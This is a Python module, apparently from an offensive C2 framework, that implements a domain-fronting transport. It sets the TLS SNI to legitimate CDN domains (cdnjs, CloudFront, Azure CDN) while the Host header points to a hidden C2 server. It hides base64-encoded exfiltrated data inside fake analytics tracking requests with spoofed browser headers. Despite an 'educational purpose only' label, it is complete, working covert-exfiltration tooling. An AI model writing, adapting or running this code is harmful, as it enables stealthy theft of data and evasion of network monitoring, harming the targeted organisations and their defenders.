"""
Domain Fronting — route C2 traffic through CDN endpoints.

Exploits the difference between TLS SNI (visible to network monitors)
and HTTP Host header (only visible after TLS decryption) to mask
the true C2 destination behind a legitimate CDN domain.

The TLS handshake advertises ``front_domain`` (a legitimate CDN origin)
while the encrypted HTTP ``Host`` header targets the real C2 server,
which must be reachable through the same CDN edge network.

Usage::

    from c2.domain_fronting import DomainFrontedTransport

    transport = DomainFrontedTransport(config={
        "front_domain": "cdn.example.com",       # Legitimate CDN domain (SNI)
        "real_host": "c2.attacker.com",           # Actual C2 host (Host header)
        "cdn_provider": "cloudflare",             # CDN provider preset
        "path": "/api/v1/analytics",              # URL path to mimic
        "user_agent": "Mozilla/5.0 ...",          # Browser UA string
    })
    transport.send(data)

EDUCATIONAL PURPOSE ONLY.
"""
from __future__ import annotations

import base64
import logging
import random
import ssl
import time
from typing import Any

from transport.base import BaseTransport

logger = logging.getLogger(__name__)

# ── CDN provider presets ──────────────────────────────────────────────
# Each preset contains sensible defaults for a given CDN: common front
# domains, typical paths that blend in, and required TLS settings.

_CDN_PRESETS: dict[str, dict[str, Any]] = {
    "cloudflare": {
        "front_domains": [
            "cdnjs.cloudflare.com",
            "cdn.jsdelivr.net",
            "unpkg.com",
        ],
        "paths": [
            "/ajax/libs/jquery/3.7.1/jquery.min.js",
            "/npm/lodash@4/lodash.min.js",
            "/api/v1/events",
        ],
        "port": 443,
        "tls_version": ssl.TLSVersion.TLSv1_2,
    },
    "cloudfront": {
        "front_domains": [
            "d1234567890.cloudfront.net",
            "d0987654321.cloudfront.net",
        ],
        "paths": [
            "/images/pixel.gif",
            "/analytics/collect",
            "/api/v2/telemetry",
        ],
        "port": 443,
        "tls_version": ssl.TLSVersion.TLSv1_2,
    },
    "azure_cdn": {
        "front_domains": [
            "ajax.aspnetcdn.com",
            "azurecomcdn.azureedge.net",
        ],
        "paths": [
            "/ajax/jQuery/jquery-3.7.1.min.js",
            "/api/telemetry/v1/collect",
            "/cdn/scripts/analytics.js",
        ],
        "port": 443,
        "tls_version": ssl.TLSVersion.TLSv1_2,
    },
}

# ── Cover story payloads ─────────────────────────────────────────────
# These mimic common analytics / tracking POST bodies so the request
# doesn't stand out in traffic logs.

_COVER_PAYLOADS = [
    {
        "content_type": "application/json",
        "template": {
            "v": "1",
            "t": "event",
            "ec": "ui_interaction",
            "ea": "click",
            "el": "nav_button",
            "cid": "{session_id}",
            "tid": "UA-000000-1",
            "z": "{cache_buster}",
        },
    },
    {
        "content_type": "application/x-www-form-urlencoded",
        "template": "v=1&t=pageview&dp=%2F&dt=Home&cid={session_id}&z={cache_buster}",
    },
]


def _make_session_id() -> str:
    """Generate a fake GA-style client ID."""
    return f"{random.randint(100000000, 999999999)}.{int(time.time())}"


class DomainFrontedTransport(BaseTransport):
    """Route data through a CDN using domain fronting.

    The TLS connection is established to ``front_domain`` (which appears
    in the SNI field visible to network monitors) while the HTTP
    ``Host`` header—encrypted inside TLS—is set to ``real_host``, the
    actual C2 server behind the CDN.

    Parameters
    ----------
    config : dict
        Configuration keys:

        - ``front_domain`` : str — the legitimate CDN domain for TLS SNI.
        - ``real_host``    : str — the real C2 host (HTTP Host header).
        - ``cdn_provider`` : str — preset name (``cloudflare``, ``cloudfront``,
          ``azure_cdn``).  Provides defaults for ``front_domain`` and ``path``.
        - ``path``         : str — URL path on the front domain.
        - ``user_agent``   : str — User-Agent header override.
        - ``port``         : int — HTTPS port (default ``443``).
        - ``timeout``      : int — request timeout in seconds (default ``30``).
        - ``verify_ssl``   : bool — verify TLS certificate (default ``True``).
    """

    def __init__(self, config: dict[str, Any]) -> None:
        super().__init__(config)

        # Resolve CDN provider preset
        provider = str(self.config.get("cdn_provider", "cloudflare"))
        preset = _CDN_PRESETS.get(provider, _CDN_PRESETS["cloudflare"])

        # Core parameters — explicit config overrides preset
        self._front_domain: str = str(
            self.config.get("front_domain", random.choice(preset["front_domains"]))
        )
        self._real_host: str = str(self.config.get("real_host", ""))
        self._path: str = str(
            self.config.get("path", random.choice(preset["paths"]))
        )
        self._port: int = int(self.config.get("port", preset.get("port", 443)))
        self._timeout: int = int(self.config.get("timeout", 30))
        self._verify_ssl: bool = bool(self.config.get("verify_ssl", True))
        self._tls_version = preset.get("tls_version", ssl.TLSVersion.TLSv1_2)

        self._user_agent: str = str(
            self.config.get(
                "user_agent",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/120.0.0.0 Safari/537.36",
            )
        )

        # Session state
        self._session: Any = None  # requests.Session (lazy import)
        self._ssl_context: ssl.SSLContext | None = None
        self._session_id: str = _make_session_id()

    # ── BaseTransport interface ───────────────────────────────────────

    def connect(self) -> None:
        """Prepare the HTTPS session and custom SSL context.

        The SSL context forces the TLS SNI to ``front_domain`` while
        requests are addressed to ``real_host`` via the Host header.
        """
        if self._connected:
            return

        try:
            import requests
            from requests.adapters import HTTPAdapter
            from urllib3.util.ssl_ import create_urllib3_context

            # Build an SSL context that pins SNI to the front domain
            self._ssl_context = create_urllib3_context()
            self._ssl_context.minimum_version = self._tls_version
            self._ssl_context.check_hostname = False
            if not self._verify_ssl:
                self._ssl_context.verify_mode = ssl.CERT_NONE

            # Custom adapter that injects the front-domain SNI
            transport_ref = self  # closure reference

            class _FrontedAdapter(HTTPAdapter):
                """HTTPAdapter that overrides the TLS server_hostname."""

                def send(self, request: Any, **kwargs: Any) -> Any:
                    # Override the Host header to the real C2 host
                    if transport_ref._real_host:
                        request.headers["Host"] = transport_ref._real_host
                    return super().send(request, **kwargs)

                def init_poolmanager(self, *args: Any, **kwargs: Any) -> None:
                    kwargs["ssl_context"] = transport_ref._ssl_context
                    kwargs["server_hostname"] = transport_ref._front_domain
                    super().init_poolmanager(*args, **kwargs)

            self._session = requests.Session()
            adapter = _FrontedAdapter(max_retries=2)
            self._session.mount("https://", adapter)

            # Default headers that mimic a real browser
            self._session.headers.update(self._build_browser_headers())

            self._connected = True
            logger.debug(
                "Domain-fronted transport connected: SNI=%s Host=%s",
                self._front_domain,
                self._real_host,
            )

        except ImportError:
            logger.error(
                "Domain fronting requires the 'requests' package. "
                "Install with: pip install requests"
            )
            raise
        except Exception as exc:
            logger.error("Failed to initialise domain-fronted transport: %s", exc)
            raise

    def send(self, data: bytes, metadata: dict[str, Any] | None = None) -> bool:
        """Send data through the domain-fronted CDN channel.

        The payload is base64-encoded and embedded in an analytics-style
        POST body so it resembles a legitimate tracking request.

        Parameters
        ----------
        data : bytes
            Raw data to exfiltrate (may already be encrypted).
        metadata : dict, optional
            Contextual metadata (``type``, ``filename``, etc.).

        Returns
        -------
        bool
            ``True`` if the request succeeded (HTTP 2xx), ``False`` otherwise.
        """
        if not self._connected:
            self.connect()

        meta = metadata or {}
        url = f"https://{self._front_domain}:{self._port}{self._path}"
        encoded_data = base64.urlsafe_b64encode(data).decode("ascii")

        try:
            # Choose a random cover story
            cover = random.choice(_COVER_PAYLOADS)
            content_type = cover["content_type"]
            cache_buster = str(random.randint(100000, 999999))

            if isinstance(cover["template"], dict):
                body = dict(cover["template"])
                body["cid"] = body.get("cid", "").replace("{session_id}", self._session_id)
                body["z"] = body.get("z", "").replace("{cache_buster}", cache_buster)
                # Embed real data in the event label field
                body["el"] = encoded_data
                if meta.get("type"):
                    body["ec"] = str(meta["type"])
                headers = {"Content-Type": content_type}
                resp = self._session.post(
                    url, json=body, headers=headers, timeout=self._timeout,
                )
            else:
                # Form-encoded body: append data as parameter
                form_body = str(cover["template"])
                form_body = form_body.replace("{session_id}", self._session_id)
                form_body = form_body.replace("{cache_buster}", cache_buster)
                form_body += f"&cd1={encoded_data}"
                headers = {"Content-Type": content_type}
                resp = self._session.post(
                    url, data=form_body, headers=headers, timeout=self._timeout,
                )

            success = 200 <= resp.status_code < 300
            if success:
                logger.debug(
                    "Domain-fronted send OK (%d bytes via %s, HTTP %d)",
                    len(data), self._front_domain, resp.status_code,
                )
            else:
                logger.warning(
                    "Domain-fronted send returned HTTP %d", resp.status_code,
                )
            return success

        except Exception as exc:
            logger.warning("Domain-fronted send failed: %s", exc)
            return False

    def disconnect(self) -> None:
        """Close the HTTPS session and release resources."""
        if self._session is not None:
            try:
                self._session.close()
            except Exception:
                pass
            self._session = None
        self._ssl_context = None
        self._connected = False
        logger.debug("Domain-fronted transport disconnected")

    # ── Internal helpers ──────────────────────────────────────────────

    def _build_browser_headers(self) -> dict[str, str]:
        """Return headers that mimic a modern browser."""
        return {
            "User-Agent": self._user_agent,
            "Accept": (
                "text/html,application/xhtml+xml,application/xml;"
                "q=0.9,image/avif,image/webp,*/*;q=0.8"
            ),
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        }

    # ── Diagnostics ──────────────────────────────────────────────────

    def get_status(self) -> dict[str, Any]:
        """Return transport status for dashboards / fleet management."""
        return {
            "type": "domain_fronting",
            "connected": self._connected,
            "front_domain": self._front_domain,
            "real_host": self._real_host,
            "path": self._path,
            "port": self._port,
            "session_id": self._session_id,
        }

    def __repr__(self) -> str:
        status = "connected" if self._connected else "disconnected"
        return (
            f"<DomainFrontedTransport "
            f"front={self._front_domain!r} "
            f"host={self._real_host!r} ({status})>"
        )
